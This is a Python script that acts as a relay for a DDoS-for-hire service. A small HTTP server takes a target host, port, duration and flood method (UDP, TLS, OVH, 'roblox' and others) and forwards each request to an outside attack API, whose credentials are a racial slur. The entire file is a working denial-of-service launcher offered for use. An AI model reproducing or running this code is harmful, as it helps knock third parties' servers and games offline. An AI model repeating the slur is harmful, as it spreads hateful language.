# seized is a white pal
# http://ip:port/api/attack?host=host&port=port&time=time&method=method
# Cop WrldAPI best api in com and funnel it, ez pz
import http.server
import socketserver
import requests

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query = self.path.split("?")[1]
        parameters = dict(qc.split("=") for qc in query.split("&"))
        host = parameters.get("host")
        port = parameters.get("port")
        time = parameters.get("time")
        method = parameters.get("method")

        # Attack shit blahblahblah
        if method == 'UDP-BYPASS':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=UDP-BYPASS")
        elif method == 'roblox':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=UDP-BYPASS")
        elif method == 'tcp':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=UDP-BYPASS")
        elif method == 'https':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=UDP-BYPASS")
        elif method == 'PPS':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=PPS")
        elif method == 'OVH':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=OVH")
        elif method == 'TLS':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=TLS")
        elif method == 'SOCKET':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=SOCKET")
        elif method == 'UDP':
            requests.get(f"https://api.wrldssex.online/api/attack?username=nigger&secret=nigger&host={host}&port={port}&time={time}&method=UDP")
        else:
            pass

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Attack request received")

HOST = 'ipofyourserveridiot'
PORT = 6969

with socketserver.TCPServer((HOST, PORT), MyHttpRequestHandler) as server:
    print(f"Starting server on http://{HOST}:{PORT}")
    server.serve_forever()
